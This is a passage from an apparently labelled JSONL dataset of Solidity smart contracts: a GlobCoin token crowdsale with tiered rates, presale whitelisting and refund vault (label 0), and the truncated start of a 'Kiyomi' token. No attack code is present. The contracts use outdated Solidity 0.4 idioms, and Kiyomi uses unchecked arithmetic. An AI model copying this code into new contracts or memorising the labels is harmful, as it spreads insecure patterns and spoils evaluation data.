}\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    require(newOwner != address(0));      \r\r\n    OwnershipTransferred(owner, newOwner);\r\r\n    owner = newOwner;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) returns (bool);\r\r\n  function approve(address spender, uint256 value) returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances. \r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) returns (bool) {\r\r\n    require(_to != address(0));\r\r\n\r\r\n    \/\/ SafeMath.sub will throw if there is not enough balance.\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of. \r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amount of tokens to be transferred\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\r\r\n    require(_to != address(0));\r\r\n\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ require (_value <= _allowance);\r\r\n\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) returns (bool) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    require((_value == 0) || (allowed[msg.sender][_spender] == 0));\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifying the amount of tokens still available for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n  \r\r\n  \/**\r\r\n   * approve should be called when allowed[_spender] == 0. To increment\r\r\n   * allowed value is better to use this function to avoid 2 calls (and wait until \r\r\n   * the first transaction is mined)\r\r\n   * From MonolithDAO Token.sol\r\r\n   *\/\r\r\n  function increaseApproval (address _spender, uint _addedValue) \r\r\n    returns (bool success) {\r\r\n    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function decreaseApproval (address _spender, uint _subtractedValue) \r\r\n    returns (bool success) {\r\r\n    uint oldValue = allowed[msg.sender][_spender];\r\r\n    if (_subtractedValue > oldValue) {\r\r\n      allowed[msg.sender][_spender] = 0;\r\r\n    } else {\r\r\n      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\r\n    }\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Mintable token\r\r\n * @dev Simple ERC20 Token example, with mintable token creation\r\r\n * @dev Issue: * https:\/\/github.com\/OpenZeppelin\/zeppelin-solidity\/issues\/120\r\r\n * Based on code by TokenMarketNet: https:\/\/github.com\/TokenMarketNet\/ico\/blob\/master\/contracts\/MintableToken.sol\r\r\n *\/\r\r\n\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n  event Mint(address indexed to, uint256 amount);\r\r\n  event MintFinished();\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n\r\r\n  modifier canMint() {\r\r\n    require(!mintingFinished);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to mint tokens\r\r\n   * @param _to The address that will receive the minted tokens.\r\r\n   * @param _amount The amount of tokens to mint.\r\r\n   * @return A boolean that indicates if the operation was successful.\r\r\n   *\/\r\r\n  function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {\r\r\n    totalSupply = totalSupply.add(_amount);\r\r\n    balances[_to] = balances[_to].add(_amount);\r\r\n    Mint(_to, _amount);\r\r\n    Transfer(0x0, _to, _amount);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to stop minting new tokens.\r\r\n   * @return True if the operation was successful.\r\r\n   *\/\r\r\n  function finishMinting() onlyOwner returns (bool) {\r\r\n    mintingFinished = true;\r\r\n    MintFinished();\r\r\n    return true;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Crowdsale\r\r\n * @dev Crowdsale is a base contract for managing a token crowdsale.\r\r\n * Crowdsales have a start and end blocks, where investors can make\r\r\n * token purchases and the crowdsale will assign them tokens based\r\r\n * on a token per ETH rate. Funds collected are forwarded to a wallet\r\r\n * as they arrive.\r\r\n *\/\r\r\ncontract Crowdsale {\r\r\n  using SafeMath for uint256;\r\r\n  \/\/ The token being sold\r\r\n  MintableToken public token;\r\r\n\r\r\n  \/\/ start and end blocks where investments are allowed (both inclusive)\r\r\n  uint256 public startBlock;\r\r\n  uint256 public endBlock;\r\r\n\r\r\n  \/\/ address where funds are collected\r\r\n  address public wallet;\r\r\n\r\r\n  \/\/ amount of raised money in wei\r\r\n  uint256 public weiRaised;\r\r\n\r\r\n  \/\/ how many token units a buyer gets per wei\r\r\n  uint256 public rate;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * event for token purchase logging\r\r\n   * @param purchaser who paid for the tokens\r\r\n   * @param beneficiary who got the tokens\r\r\n   * @param value weis paid for purchase\r\r\n   * @param amount amount of tokens purchased\r\r\n   *\/\r\r\n  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\r\r\n\r\r\n\r\r\n  function Crowdsale(uint256 _startBlock, uint256 _endBlock, address _wallet) {\r\r\n    require(_startBlock >= block.number);\r\r\n    require(_endBlock >= _startBlock);\r\r\n    require(_wallet != 0x0);\r\r\n\r\r\n    token = createTokenContract();\r\r\n    startBlock = _startBlock;\r\r\n    endBlock = _endBlock;\r\r\n    wallet = _wallet;\r\r\n  }\r\r\n\r\r\n  \/\/ creates the token to be sold.\r\r\n  \/\/ override this method to have crowdsale of a specific mintable token.\r\r\n  function createTokenContract() internal returns (MintableToken) {\r\r\n    return new MintableToken();\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/ fallback function can be used to buy tokens\r\r\n  function () payable {\r\r\n    buyTokens(msg.sender);\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/ low level token purchase function\r\r\n  function buyTokens(address beneficiary) public payable {\r\r\n    require(beneficiary != 0x0);\r\r\n    require(validPurchase());\r\r\n\r\r\n    uint256 weiAmount = msg.value;\r\r\n\r\r\n    \/\/ calculate token amount to be created\r\r\n    uint256 tokens = weiAmount.mul(rate);\r\r\n\r\r\n    \/\/ update state\r\r\n    weiRaised = weiRaised.add(weiAmount);\r\r\n\r\r\n    token.mint(beneficiary, tokens);\r\r\n    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\r\r\n\r\r\n    forwardFunds();\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/ send ether to the fund collection wallet\r\r\n  \/\/ override to create custom fund forwarding mechanisms\r\r\n  function forwardFunds() internal {\r\r\n    wallet.transfer(msg.value);\r\r\n  }\r\r\n\r\r\n  \/\/ @return true if the transaction can buy tokens\r\r\n  function validPurchase() internal constant returns (bool) {\r\r\n    bool withinPeriod = block.number >= startBlock && block.number <= endBlock;\r\r\n    bool nonZeroPurchase = msg.value != 0;\r\r\n    return withinPeriod && nonZeroPurchase;\r\r\n  }\r\r\n\r\r\n  \/\/ @return true if crowdsale event has ended\r\r\n  function hasEnded() public constant returns (bool) {\r\r\n    return block.number > endBlock;\r\r\n  }\r\r\n\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title CappedCrowdsale\r\r\n * @dev Extension of Crowsdale with a max amount of funds raised\r\r\n *\/\r\r\ncontract CappedCrowdsale is Crowdsale {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  uint256 public cap;\r\r\n\r\r\n  function CappedCrowdsale(uint256 _cap) {\r\r\n    require(_cap > 0);\r\r\n    cap = _cap;\r\r\n  }\r\r\n\r\r\n  \/\/ overriding Crowdsale#validPurchase to add extra cap logic\r\r\n  \/\/ @return true if investors can buy at the moment\r\r\n  function validPurchase() internal constant returns (bool) {\r\r\n    bool withinCap = weiRaised.add(msg.value) <= cap;\r\r\n    return super.validPurchase() && withinCap;\r\r\n  }\r\r\n\r\r\n  \/\/ overriding Crowdsale#hasEnded to add cap logic\r\r\n  \/\/ @return true if crowdsale event has ended\r\r\n  function hasEnded() public constant returns (bool) {\r\r\n    bool capReached = weiRaised >= cap;\r\r\n    return super.hasEnded() || capReached;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title FinalizableCrowdsale\r\r\n * @dev Extension of Crowsdale where an owner can do extra work\r\r\n * after finishing. \r\r\n *\/\r\r\ncontract FinalizableCrowdsale is Crowdsale, Ownable {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  bool public isFinalized = false;\r\r\n\r\r\n  event Finalized();\r\r\n\r\r\n  \/**\r\r\n   * @dev Must be called after crowdsale ends, to do some extra finalization\r\r\n   * work. Calls the contract&#39;s finalization function.\r\r\n   *\/\r\r\n  function finalize() onlyOwner {\r\r\n    require(!isFinalized);\r\r\n    require(hasEnded());\r\r\n\r\r\n    finalization();\r\r\n    Finalized();\r\r\n    \r\r\n    isFinalized = true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Can be overriden to add finalization logic. The overriding function\r\r\n   * should call super.finalization() to ensure the chain of finalization is\r\r\n   * executed entirely.\r\r\n   *\/\r\r\n  function finalization() internal {\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title RefundVault\r\r\n * @dev This contract is used for storing funds while a crowdsale\r\r\n * is in progress. Supports refunding the money if crowdsale fails,\r\r\n * and forwarding it if crowdsale is successful.\r\r\n *\/\r\r\ncontract RefundVault is Ownable {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  enum State { Active, Refunding, Closed }\r\r\n\r\r\n  mapping (address => uint256) public deposited;\r\r\n  address public wallet;\r\r\n  State public state;\r\r\n\r\r\n  event Closed();\r\r\n  event RefundsEnabled();\r\r\n  event Refunded(address indexed beneficiary, uint256 weiAmount);\r\r\n\r\r\n  function RefundVault(address _wallet) {\r\r\n    require(_wallet != 0x0);\r\r\n    wallet = _wallet;\r\r\n    state = State.Active;\r\r\n  }\r\r\n\r\r\n  function deposit(address investor) onlyOwner payable {\r\r\n    require(state == State.Active);\r\r\n    deposited[investor] = deposited[investor].add(msg.value);\r\r\n  }\r\r\n\r\r\n  function close() onlyOwner {\r\r\n    require(state == State.Active);\r\r\n    state = State.Closed;\r\r\n    Closed();\r\r\n    wallet.transfer(this.balance);\r\r\n  }\r\r\n\r\r\n  function enableRefunds() onlyOwner {\r\r\n    require(state == State.Active);\r\r\n    state = State.Refunding;\r\r\n    RefundsEnabled();\r\r\n  }\r\r\n\r\r\n  function refund(address investor) {\r\r\n    require(state == State.Refunding);\r\r\n    uint256 depositedValue = deposited[investor];\r\r\n    deposited[investor] = 0;\r\r\n    investor.transfer(depositedValue);\r\r\n    Refunded(investor, depositedValue);\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title RefundableCrowdsale\r\r\n * @dev Extension of Crowdsale contract that adds a funding goal, and\r\r\n * the possibility of users getting a refund if goal is not met.\r\r\n * Uses a RefundVault as the crowdsale&#39;s vault.\r\r\n *\/\r\r\ncontract RefundableCrowdsale is FinalizableCrowdsale {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  \/\/ minimum amount of funds to be raised in weis\r\r\n  uint256 public goal;\r\r\n\r\r\n  \/\/ refund vault used to hold funds while crowdsale is running\r\r\n  RefundVault public vault;\r\r\n\r\r\n  function RefundableCrowdsale(uint256 _goal) {\r\r\n    require(_goal > 0);\r\r\n    vault = new RefundVault(wallet);\r\r\n    goal = _goal;\r\r\n  }\r\r\n\r\r\n  \/\/ We&#39;re overriding the fund forwarding from Crowdsale.\r\r\n  \/\/ In addition to sending the funds, we want to call\r\r\n  \/\/ the RefundVault deposit function\r\r\n  function forwardFunds() internal {\r\r\n    vault.deposit.value(msg.value)(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/\/ if crowdsale is unsuccessful, investors can claim refunds here\r\r\n  function claimRefund() {\r\r\n    require(isFinalized);\r\r\n    require(!goalReached());\r\r\n\r\r\n    vault.refund(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/\/ vault finalization task, called when owner calls finalize()\r\r\n  function finalization() internal {\r\r\n    if (goalReached()) {\r\r\n      vault.close();\r\r\n    } else {\r\r\n      vault.enableRefunds();\r\r\n    }\r\r\n\r\r\n    super.finalization();\r\r\n  }\r\r\n\r\r\n  function goalReached() public constant returns (bool) {\r\r\n    return weiRaised >= goal;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\ncontract GlobCoinToken is MintableToken {\r\r\n  using SafeMath for uint256;\r\r\n  string public constant name = \"GlobCoin Crypto Platform\";\r\r\n  string public constant symbol = \"GCP\";\r\r\n  uint8 public constant decimals = 18;\r\r\n\r\r\n  modifier onlyMintingFinished() {\r\r\n    require(mintingFinished == true);\r\r\n    _;\r\r\n  }\r\r\n  \/\/\/ @dev Same ERC20 behavior, but require the token to be unlocked\r\r\n  \/\/\/ @param _spender address The address which will spend the funds.\r\r\n  \/\/\/ @param _value uint256 The amount of tokens to be spent.\r\r\n  function approve(address _spender, uint256 _value) public onlyMintingFinished returns (bool) {\r\r\n      return super.approve(_spender, _value);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Same ERC20 behavior, but require the token to be unlocked\r\r\n  \/\/\/ @param _to address The address to transfer to.\r\r\n  \/\/\/ @param _value uint256 The amount to be transferred.\r\r\n  function transfer(address _to, uint256 _value) public onlyMintingFinished returns (bool) {\r\r\n      return super.transfer(_to, _value);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Same ERC20 behavior, but require the token to be unlocked\r\r\n  \/\/\/ @param _from address The address which you want to send tokens from.\r\r\n  \/\/\/ @param _to address The address which you want to transfer to.\r\r\n  \/\/\/ @param _value uint256 the amount of tokens to be transferred.\r\r\n  function transferFrom(address _from, address _to, uint256 _value) public onlyMintingFinished returns (bool) {\r\r\n    return super.transferFrom(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\ncontract GlobcoinTokenSale is CappedCrowdsale, RefundableCrowdsale {\r\r\n\r\r\n  \/\/Start of the Actual crowdsale. Starblock is the start of the presale.\r\r\n  uint256 public startSale;\r\r\n  uint256 public endPresale;\r\r\n\r\r\n  \/\/ Presale Rate per wei ~30% bonus over rate1\r\r\n  uint256 public constant PRESALERATE = 17000;\r\r\n\r\r\n  \/\/ new rates\r\r\n  uint256 public constant RATE1 = 13000;\r\r\n  uint256 public constant RATE2 = 12000;\r\r\n  uint256 public constant RATE3 = 11000;\r\r\n  uint256 public constant RATE4 = 10000;\r\r\n\r\r\n\r\r\n  \/\/ Cap per tier for bonus in wei.\r\r\n  uint256 public constant TIER1 =  3000000000000000000000;\r\r\n  uint256 public constant TIER2 =  5000000000000000000000;\r\r\n  uint256 public constant TIER3 =  7500000000000000000000;\r\r\n\r\r\n  \/\/Presale\r\r\n  uint256 public weiRaisedPreSale;\r\r\n  uint256 public presaleCap;\r\r\n\r\r\n  function GlobcoinTokenSale(uint256 _startBlock, uint256 _endPresale, uint256 _startSale, uint256 _endBlock, uint256 _goal,uint256 _presaleCap, uint256 _cap, address _wallet) public\r\r\n  CappedCrowdsale(_cap) FinalizableCrowdsale() RefundableCrowdsale(_goal) Crowdsale(_startBlock, _endBlock, _wallet) {\r\r\n    require(_goal <= _cap);\r\r\n    require(_startSale > _startBlock);\r\r\n    require(_endBlock > _startSale);\r\r\n    require(_presaleCap > 0);\r\r\n    require(_presaleCap <= _cap);\r\r\n\r\r\n    startSale = _startSale;\r\r\n    endPresale = _endPresale;\r\r\n    presaleCap = _presaleCap;\r\r\n  }\r\r\n\r\r\n  function createTokenContract() internal returns (MintableToken) {\r\r\n    return new GlobCoinToken();\r\r\n  }\r\r\n\r\r\n  \/\/white listed address\r\r\n  mapping (address => bool) public whiteListedAddress;\r\r\n  mapping (address => bool) public whiteListedAddressPresale;\r\r\n\r\r\n  modifier onlyPresaleWhitelisted() {\r\r\n    require( isWhitelistedPresale(msg.sender) ) ;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyWhitelisted() {\r\r\n    require( isWhitelisted(msg.sender) || isWhitelistedPresale(msg.sender) ) ;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Add a list of address to be whitelisted for the crowdsale only.\r\r\n   * @param _users , the list of user Address. Tested for out of gas until 200 addresses.\r\r\n   *\/\r\r\n  function whitelistAddresses( address[] _users) onlyOwner {\r\r\n    for( uint i = 0 ; i < _users.length ; i++ ) {\r\r\n      whiteListedAddress[_users[i]] = true;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  function unwhitelistAddress( address _users) onlyOwner {\r\r\n    whiteListedAddress[_users] = false;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Add a list of address to be whitelisted for the Presale And sale.\r\r\n   * @param _users , the list of user Address. Tested for out of gas until 200 addresses.\r\r\n   *\/\r\r\n  function whitelistAddressesPresale( address[] _users) onlyOwner {\r\r\n    for( uint i = 0 ; i < _users.length ; i++ ) {\r\r\n      whiteListedAddressPresale[_users[i]] = true;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  function unwhitelistAddressPresale( address _users) onlyOwner {\r\r\n    whiteListedAddressPresale[_users] = false;\r\r\n  }\r\r\n\r\r\n  function isWhitelisted(address _user) public constant returns (bool) {\r\r\n    return whiteListedAddress[_user];\r\r\n  }\r\r\n\r\r\n  function isWhitelistedPresale(address _user) public constant returns (bool) {\r\r\n    return whiteListedAddressPresale[_user];\r\r\n  }\r\r\n\r\r\n  function () payable {\r\r\n    if (validPurchasePresale()){\r\r\n      buyTokensPresale(msg.sender);\r\r\n    } else {\r\r\n      buyTokens(msg.sender);\r\r\n    }\r\r\n  }\r\r\n\r\r\n  function buyTokens(address beneficiary) payable onlyWhitelisted {\r\r\n    require(beneficiary != 0x0);\r\r\n    require(validPurchase());\r\r\n\r\r\n    uint256 weiAmount = msg.value;\r\r\n    uint256 tokens = calculateTokenAmount(weiAmount);\r\r\n    weiRaised = weiRaised.add(weiAmount);\r\r\n\r\r\n    token.mint(beneficiary, tokens);\r\r\n    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\r\r\n    forwardFunds();\r\r\n  }\r\r\n\r\r\n  function buyTokensPresale(address beneficiary) payable onlyPresaleWhitelisted {\r\r\n    require(beneficiary != 0x0);\r\r\n    require(validPurchasePresale());\r\r\n\r\r\n    uint256 weiAmount = msg.value;\r\r\n    uint256 tokens = weiAmount.mul(PRESALERATE);\r\r\n    weiRaisedPreSale = weiRaisedPreSale.add(weiAmount);\r\r\n\r\r\n    token.mint(beneficiary, tokens);\r\r\n    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\r\r\n    forwardFunds();\r\r\n  }\r\r\n\r\r\n  \/\/ calculate the amount of token the user is getting - can overlap on multiple tiers.\r\r\n  function calculateTokenAmount(uint256 weiAmount) internal returns (uint256){\r\r\n    uint256 amountToBuy = weiAmount;\r\r\n    uint256 amountTokenBought;\r\r\n    uint256 currentWeiRaised = weiRaised;\r\r\n     if (currentWeiRaised < TIER1 && amountToBuy > 0) {\r\r\n       var (amountBoughtInTier, amountLeftTobuy) = calculateAmountPerTier(amountToBuy,TIER1,RATE1,currentWeiRaised);\r\r\n       amountTokenBought = amountTokenBought.add(amountBoughtInTier);\r\r\n       currentWeiRaised = currentWeiRaised.add(amountToBuy.sub(amountLeftTobuy));\r\r\n       amountToBuy = amountLeftTobuy;\r\r\n     }\r\r\n     if (currentWeiRaised < TIER2 && amountToBuy > 0) {\r\r\n      (amountBoughtInTier, amountLeftTobuy) = calculateAmountPerTier(amountToBuy,TIER2,RATE2,currentWeiRaised);\r\r\n      amountTokenBought = amountTokenBought.add(amountBoughtInTier);\r\r\n      currentWeiRaised = currentWeiRaised.add(amountToBuy.sub(amountLeftTobuy));\r\r\n      amountToBuy = amountLeftTobuy;\r\r\n     }\r\r\n     if (currentWeiRaised < TIER3 && amountToBuy > 0) {\r\r\n      (amountBoughtInTier, amountLeftTobuy) = calculateAmountPerTier(amountToBuy,TIER3,RATE3,currentWeiRaised);\r\r\n      amountTokenBought = amountTokenBought.add(amountBoughtInTier);\r\r\n      currentWeiRaised = currentWeiRaised.add(amountToBuy.sub(amountLeftTobuy));\r\r\n      amountToBuy = amountLeftTobuy;\r\r\n     }\r\r\n    if ( currentWeiRaised < cap && amountToBuy > 0) {\r\r\n      (amountBoughtInTier, amountLeftTobuy) = calculateAmountPerTier(amountToBuy,cap,RATE4,currentWeiRaised);\r\r\n      amountTokenBought = amountTokenBought.add(amountBoughtInTier);\r\r\n      currentWeiRaised = currentWeiRaised.add(amountToBuy.sub(amountLeftTobuy));\r\r\n      amountToBuy = amountLeftTobuy;\r\r\n    }\r\r\n    return amountTokenBought;\r\r\n  }\r\r\n\r\r\n  \/\/ calculate the amount of token within a tier.\r\r\n  function calculateAmountPerTier(uint256 amountToBuy,uint256 tier,uint256 rate,uint256 currentWeiRaised) internal returns (uint256,uint256) {\r\r\n    uint256 amountAvailable = tier.sub(currentWeiRaised);\r\r\n    if ( amountToBuy > amountAvailable ) {\r\r\n      uint256 amountBoughtInTier = amountAvailable.mul(rate);\r\r\n      amountToBuy = amountToBuy.sub(amountAvailable);\r\r\n      return (amountBoughtInTier,amountToBuy);\r\r\n    } else {\r\r\n      amountBoughtInTier = amountToBuy.mul(rate);\r\r\n      return (amountBoughtInTier,0);\r\r\n    }\r\r\n  }\r\r\n\r\r\n  function finalization() internal {\r\r\n    if (goalReached()) {\r\r\n      \/\/Globcoin gets 60% of the amount of the total token supply\r\r\n      uint256 totalSupply = token.totalSupply();\r\r\n      \/\/ total supply\r\r\n      token.mint(wallet, totalSupply);\r\r\n      \/\/ 50% of tokens generated during crowdsale to make it 60% for GC\r\r\n      token.mint(wallet, totalSupply.div(2));\r\r\n      token.finishMinting();\r\r\n    }\r\r\n    super.finalization();\r\r\n  }\r\r\n\r\r\n  \/\/ Override of the validPurchase function so that the new sale periode start at StartSale instead of Startblock.\r\r\n  function validPurchase() internal constant returns (bool) {\r\r\n    bool withinPeriod = block.number >= startSale && block.number <= endBlock;\r\r\n    bool nonZeroPurchase = msg.value != 0;\r\r\n    uint256 totalWeiRaised = weiRaisedPreSale.add(weiRaised);\r\r\n    bool withinCap = totalWeiRaised.add(msg.value) <= cap;\r\r\n    return withinCap && withinPeriod && nonZeroPurchase;\r\r\n  }\r\r\n\r\r\n  \/\/ Sale period start at StartBlock until the sale Start ( startSale )\r\r\n  function validPurchasePresale() internal constant returns (bool) {\r\r\n    bool withinPeriod = (block.number >= startBlock) && (block.number <= endPresale);\r\r\n    bool nonZeroPurchase = msg.value != 0;\r\r\n    bool withinCap = weiRaisedPreSale.add(msg.value) <= presaleCap;\r\r\n    return withinPeriod && nonZeroPurchase && withinCap;\r\r\n  }\r\r\n\r\r\n  \/\/ Override of the goalReached function so that the goal take into account the token raised during the Presale.\r\r\n  function goalReached() public constant returns (bool) {\r\r\n    uint256 totalWeiRaised = weiRaisedPreSale.add(weiRaised);\r\r\n    return totalWeiRaised >= goal || super.goalReached();\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\n\r\r\n\r\r\ncontract Kiyomi {\r\r\n    string public constant symbol = \"pep\";\r\r\n\r\r\n    string public constant name = \"Kiyomi\";\r\r\n\r\r\n    uint public constant decimals = 8;\r\r\n\r\r\n    uint _totalSupply = 21000000 * 10 ** decimals;\r\r\n\r\r\n    uint public marketSupply;\r\r\n\r\r\n    uint public marketPrice;\r\r\n\r\r\n    address owner;\r\r\n\r\r\n    mapping (address => uint) accounts;\r\r\n\r\r\n    mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\r\n\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\r\n\r\r\n    function Kiyomi() public {\r\r\n        owner = msg.sender;\r\r\n        accounts[owner] = _totalSupply;\r\r\n        Transfer(address(0), owner, _totalSupply);\r\r\n    }\r\r\n\r\r\n    function totalSupply() public constant returns (uint __totalSupply) {\r\r\n        return _totalSupply;\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _account) public constant returns (uint balance) {\r\r\n        return accounts[_account];\r\r\n    }\r\r\n\r\r\n    function allowance(address _account, address _spender) public constant returns (uint remaining) {\r\r\n        return allowed[_account][_spender];\r\r\n    }\r\r\n\r\r\n    function transfer(address _to, uint _amount) public returns (bool success) {\r\r\n        require(_amount > 0 && accounts[msg.sender] >= _amount);\r\r\n        accounts[msg.sender] -= _amount;\r\r\n        accounts[_to] += _amount;\r\r\n        Transfer(msg.sender, _to, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint _amount) public returns (bool success) {\r\r\n        require(_amount > 0 && accounts[_from] >= _amount && allowed[_from][msg.sender] >= _amount);\r\r\n        accounts[_from] -= _amount;\r\r\n        allowed[_from][msg.sender] -= _amount;\r\r\n        accounts[_to] += _amount;\r\r\n        Transfer(_from, _to, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint _amount) public returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _amount;\r\r\n        Approval(msg.sender, _spender, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function purchase() public payable returns (bool _status) {\r\r\n        require(msg.value > 0 && marketSupply > 0 && marketPrice > 0 && accounts[owner] > 0);\r\r\n        \/\/ Calculate available and required units\r\r\n        uint unitsAvailable = accounts[owner] < marketSupply ? accounts[owner] : marketSupply;\r\r\n        uint unitsRequired = msg.value \/ marketPrice;\r\r\n        uint unitsFinal = unitsAvailable < unitsRequired ? unitsAvailable : unitsRequired;\r\r\n        \/\/ Transfer funds\r\r\n        marketSupply -= 